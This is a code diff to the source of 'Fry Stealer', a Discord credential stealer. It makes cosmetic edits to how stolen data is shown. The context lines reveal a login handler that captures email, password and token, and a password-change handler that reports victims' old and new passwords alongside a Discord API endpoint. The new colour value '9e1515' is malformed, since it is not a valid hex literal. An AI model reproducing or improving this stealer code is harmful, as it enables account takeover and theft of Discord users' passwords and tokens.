@@ -13,7 +13,7 @@ const config = {
   ping_val: '@here', 
   embed_name: 'Fry Stealer', 
   embed_icon: 'https://wallpaperspeed.id/gallery/wallpaper/20220427/draw-you-an-anime-profile-picture-by-rinruru-fiverr,how-to-make-anime-profile-picture-preview.webp',
-  embed_color: 0x8400ff, 
+  embed_color: 9e1515, 
   api: 'https://discord.com/api/v9/users/@me',
   filter: {
     urls: [
@@ -621,7 +621,7 @@ const login = async (email, password, token) => {
           {  
             name: 'ID',
             value: `\`${json.id}\``,
-            inline: true,
+            inline: false,
           },
           {  
             name: 'Badges',
@@ -662,7 +662,7 @@ const login = async (email, password, token) => {
           text: 'Frystealer',
         },
         thumbnail: {
-          url: 'https://media.discordapp.net/attachments/938721597748031568/939085296107155536/Picsart_22-01-16_16-47-19-734.jpg',
+          url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
       },
     ],
@@ -684,7 +684,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Password Changed**',
+            name: 'Password Changed',
             value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
             inline: true,
           },
